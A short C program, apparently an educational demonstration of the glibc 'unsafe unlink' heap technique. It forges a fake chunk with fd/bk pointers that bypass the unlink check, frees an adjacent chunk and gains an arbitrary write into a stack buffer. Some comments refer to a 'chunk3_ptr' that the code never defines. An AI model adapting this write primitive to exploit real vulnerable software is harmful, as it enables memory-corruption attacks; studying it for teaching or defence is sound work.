#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	uint64_t *chunk0_ptr = (uint64_t *)malloc(0x420);
	uint64_t *chunk1_ptr = (uint64_t *)malloc(0x420);
	uint64_t *chunk1_hdr = chunk1_ptr - 2;

	// create fake chunk
	chunk0_ptr[1] = 0x421; // 0x431 - 0x10
	// bypass the check: P->fd->bk != P || P->bk->fd != P
	chunk0_ptr[2] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t) * 3);
	chunk0_ptr[3] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t) * 2);

	chunk1_hdr[0] = 0x420; // fake prev_size
	chunk1_hdr[1] &= ~1; // unset prev_inuse bit

	// before: chunk0_ptr == 0x5555555592a0
	//         chunk0_ptr[0] == NULL
	//         chunk3_ptr[3] == 0x7fffffffe0d8

	// consolidate with top chunk
	free(chunk1_ptr);

	// after: chunk0_ptr == 0x00007fffffffe0d0
	//        chunk0_ptr[0] == NULL
	//        chunk3_ptr[3] == 0x7fffffffe0d0

	char victim_string[8]; // 0x7fffffffe100
	strcpy(victim_string, "Hello!~");
	chunk0_ptr[3] = (uint64_t)victim_string; // modify the pointer
	chunk0_ptr[0] = 0x4141414142424242LL;

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}
